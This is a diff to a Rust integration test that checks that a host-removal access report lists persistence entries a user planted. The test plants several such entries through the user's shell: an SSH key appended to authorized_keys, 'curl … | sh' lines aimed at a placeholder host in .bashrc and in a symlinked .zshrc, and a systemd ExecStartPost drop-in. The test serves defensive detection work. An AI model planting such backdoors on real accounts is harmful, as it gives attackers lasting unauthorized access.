@@ -1,9 +1,10 @@
 //! D356 delivered end to end on a real root host (#355): a live server with
 //! its HTTPS listener, a real `infraternal agent` joined as root, a real
 //! host login for a person on a real account, and the real CLI. The person
-//! plants access lines through their own shell; removing the host revokes
-//! the login, the agent reports the lines, the server keeps them, and
-//! `remove-host --access-report` prints them.
+//! plants access lines through their own shell (a key, a startup line with a
+//! terminal escape, a startup file linked into the home, a unit drop-in);
+//! removing the host revokes the login, the agent reports them, the server
+//! keeps them, and `remove-host --access-report` prints them.
 //!
 //! Run only as root, through a root clone of the commit under review (see the
 //! job's script on #355): it creates real host logins and stops them.
@@ -145,7 +146,7 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
     first_terminal_output(&mut browser, &mut output, &mut cursor).await;
     // Through the person's own shell: say who it runs as, then plant one new
     // key and one startup line carrying a terminal escape.
-    let planting = b"printf 'WHO_%s_END\\n' \"$(id -un)\"; mkdir -p ~/.ssh && printf 'ssh-ed25519 AAAAlive live-left-behind\\n' >> ~/.ssh/authorized_keys && printf 'curl -s http://example.invalid/live | sh \\033[2J\\n' >> ~/.bashrc && printf 'PLANTED_%s\\n' DONE\n";
+    let planting = b"printf 'WHO_%s_END\\n' \"$(id -un)\"; mkdir -p ~/.ssh && printf 'ssh-ed25519 AAAAlive live-left-behind\\n' >> ~/.ssh/authorized_keys && printf 'curl -s http://example.invalid/live | sh \\033[2J\\n' >> ~/.bashrc && printf 'curl -s http://example.invalid/linked | sh\\n' > ~/.evilrc && ln -s .evilrc ~/.zshrc && mkdir -p ~/.config/systemd/user/back.service.d && printf '[Service]\\nExecStartPost=/tmp/live-evil\\n' > ~/.config/systemd/user/back.service.d/x.conf && printf 'PLANTED_%s\\n' DONE\n";
     send(
         &mut browser,
         1,
@@ -197,7 +198,7 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
         .await;
         assert!(ok, "report read refused: {read}");
         let read = record(&read);
-        if read["data"]["state"] == "ready" {
+        if read["data"]["state"] == "reported" {
             break read;
         }
         assert!(
@@ -223,7 +224,27 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
     .await;
     assert!(ok);
     println!("REMOVE_HOST_ACCESS_REPORT_HUMAN\n{human}");
+    assert!(
+        human.contains(&format!("Account {account}: changed since the grant.")),
+        "{human}"
+    );
     assert!(human.contains("~/.ssh/authorized_keys"), "{human}");
+    // A startup file planted as a link into the home: the link is reported
+    // with its target, and the target's line is shown (never followed).
+    assert!(
+        human.contains("new: ~/.zshrc (a symbolic link to .evilrc; not followed)"),
+        "{human}"
+    );
+    assert!(
+        human.contains("+ curl -s http://example.invalid/linked | sh"),
+        "{human}"
+    );
+    // A systemd drop-in adding a command to a unit.
+    assert!(
+        human.contains("~/.config/systemd/user/back.service.d/x.conf"),
+        "{human}"
+    );
+    assert!(human.contains("+ ExecStartPost=/tmp/live-evil"), "{human}");
     assert!(
         human.contains("  + ssh-ed25519 AAAAlive live-left-behind"),
         "{human}"
@@ -242,7 +263,11 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
     assert!(keys.contains("ssh-ed25519 AAAAlive live-left-behind"));
     let startup = std::fs::read(user.dir.join(".bashrc")).unwrap();
     assert!(startup.windows(4).any(|window| window == b"\x1b[2J"));
-    println!("ACCESS_FILES_UNTOUCHED authorized_keys=kept bashrc=kept");
+    assert_eq!(
+        std::fs::read_link(user.dir.join(".zshrc")).unwrap(),
+        Path::new(".evilrc")
+    );
+    println!("ACCESS_FILES_UNTOUCHED authorized_keys=kept bashrc=kept zshrc_link=kept");
     drop(child);
     drop(fixture);
     drop(directory);
